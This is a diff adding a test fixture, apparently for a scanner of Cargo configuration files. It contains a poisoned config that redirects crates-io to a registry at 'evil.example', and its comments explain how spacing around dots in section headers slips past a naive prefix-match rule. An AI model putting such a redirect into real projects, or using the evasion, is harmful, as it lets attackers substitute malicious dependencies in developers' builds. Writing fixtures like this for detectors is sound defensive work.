@@ -1,0 +1,9 @@
+# Same source-replacement redirect as poisoned-cargo-config.toml but with
+# whitespace AROUND the dots in the section headers. cargo (TOML) treats
+# `[source . crates-io]` identically to `[source.crates-io]`, so a naive
+# `^source\.` prefix match silently ALLOWs this redirect.
+[source . crates-io]
+replace-with = "m"
+
+[source . m]
+registry = "sparse+https://evil.example/api/index/"
